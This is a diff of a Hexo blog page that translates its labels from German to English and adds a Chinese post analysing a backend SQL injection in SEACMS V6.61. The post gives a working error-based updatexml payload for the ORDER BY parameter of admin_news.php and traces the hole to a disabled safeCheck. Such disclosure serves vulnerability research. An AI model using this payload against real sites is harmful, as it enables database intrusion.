@@ -181,7 +181,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Home
           </a>
         </li>
       
@@ -191,7 +191,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -214,6 +214,153 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="moonfish">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moonfish's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/" itemprop="url">SEACMS最新版(V6.61)后台SQL注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-08T09:20:35+08:00">
+                2018-06-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>后台注入，需要登录</p>
+<p>注入点在order by 后面</p>
+<p>正常访问时：</p>
+<pre><code>http://localhost/seacmsv6.61/meet/admin_news.php?n_commend=&amp;order=n_id--#&amp;page=0&amp;type=
+</code></pre><p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片1.png" alt=""></p>
+<p>倒序时：</p>
+<pre><code>http://localhost/seacmsv6.61/meet/admin_news.php?n_commend=&amp;order=n_id+desc--#&amp;page=0&amp;type=
+</code></pre><p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片2.png" alt=""></p>
+<p>使用updatexml进行报错注入</p>
+<pre><code>http://localhost/seacmsv6.61/meet/admin_news.php?n_commend=&amp;order=n_id+and(updatexml(1,concat(0x7e,(select%20user())),0))--#&amp;page=0&amp;type=
+</code></pre><p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片3.png" alt=""></p>
+<h2 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h2><p>漏洞文件：</p>
+<pre><code>\seacmsV6.61\admin\templets\admin_news.htm
+</code></pre><p>admin_news.php 中使用include包含该文件</p>
+<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片4.png" alt=""></p>
+<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片5.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numPerPage=20;</span><br><span class="line">if(empty($order)) $order=&quot;n_addtime&quot;;  //$order的值不为空</span><br><span class="line">$orderStr= &quot; order by d.$order desc&quot;; // d拼接$order</span><br><span class="line">$page = isset($page) ? intval($page) : 1;</span><br><span class="line">if($page==0) $page=1;</span><br><span class="line">$whereStr=&quot;  &quot;;</span><br><span class="line">if ($action==&quot;nullpic&quot;) $whereStr.=&quot; and d.v_pic=&apos;&apos;&quot;;</span><br><span class="line">if ($n_recycled==&quot;ok&quot;) $whereStr.=&quot; and d.n_recycled=1&quot;;</span><br><span class="line">if (!empty($type)) $whereStr.=&quot; and d.tid in (&quot;.getTypeId($type).&quot;)&quot;;</span><br><span class="line">if (!empty($keyword)) $whereStr.=&quot; and d.n_title like &apos;%&quot;.$keyword.&quot;%&apos;&quot;;</span><br><span class="line">$whereorder = str_replace(&quot;where order&quot;,&quot;order&quot;,str_replace(&quot;where and&quot;,&quot;and&quot;,$whereStr.$orderStr)); //$whereorder 即为&quot;  order by d.$order desc&quot;</span><br><span class="line">$csqlStr=&quot;select count(*) as dd from `sea_news` d where d.n_recycled=0 &quot;.$whereorder; //第一处拼接查询语句</span><br><span class="line">if ($n_recycled==&quot;ok&quot;)$csqlStr=&quot;select count(*) as dd from `sea_news` d where d.n_recycled=1 &quot;.$whereorder;</span><br><span class="line">$row = $dsql-&gt;GetOne($csqlStr); 执行</span><br><span class="line">if(is_array($row))&#123;</span><br><span class="line">$TotalResult = $row[&apos;dd&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$TotalResult = 0;</span><br><span class="line">&#125;</span><br><span class="line">$TotalPage = ceil($TotalResult/$numPerPage);</span><br><span class="line">if ($page&gt;$TotalPage) $page=$TotalPage;</span><br><span class="line">$limitstart = ($page-1) * $numPerPage;</span><br><span class="line">if($limitstart&lt;0) $limitstart=0;</span><br><span class="line">$sqlStr=&quot;select d.n_id,d.n_title,d.n_hit,0,d.tid,d.n_addtime,d.n_commend,t.tname from sea_news d left join `sea_type` t on t.tid=d.tid where d.n_recycled=0 &quot;.$whereorder.&quot; limit $limitstart,$numPerPage&quot;; //第二处拼接查询语句</span><br><span class="line">if ($n_recycled==&quot;ok&quot;) $sqlStr=&quot;select d.n_id,d.n_title,d.n_hit,0,d.tid,d.n_addtime,d.n_commend,t.tname from sea_news d left join `sea_type` t on t.tid=d.tid  where 1=1 &quot;.$whereorder.&quot; limit $limitstart,$numPerPage&quot;;</span><br><span class="line">//echo $sqlStr;die();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>跟进GetOne()</p>
+<pre><code>seacmsV6.61\include\sql.class.php
+</code></pre><p>主要是看Execute()</p>
+<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片6.png" alt=""></p>
+<p>数据在进入mysql_query()之前会进行SQL语句安全检查，重点在这</p>
+<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片7.png" alt=""></p>
+<p>这里的$this-&gt;safeCheck前面赋值为true,但是我们的payload没有进入SQL语句安全检测，为什么呢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  if($this-&gt;safeCheck)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            CheckSql($this-&gt;queryString);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>admin_news.php 中包含seacmsV6.61\admin\config.php</p>
+<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片8.png" alt=""></p>
+<p>config.php中的$dsql-&gt;safeCheck=false，所以就跳过了CheckSql()这个检查函数,SQL注入因此产生</p>
+<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片9.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -257,7 +404,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-01T14:37:51+08:00">
                 2018-06-01
@@ -385,7 +532,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-11T14:11:09+08:00">
                 2018-05-11
@@ -514,7 +661,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-18T00:56:16+08:00">
                 2017-12-18
@@ -660,8 +807,8 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
-                  <span class="site-state-item-name">Artikel</span>
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
                 </a>
               </div>
             
@@ -713,7 +860,7 @@
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
 
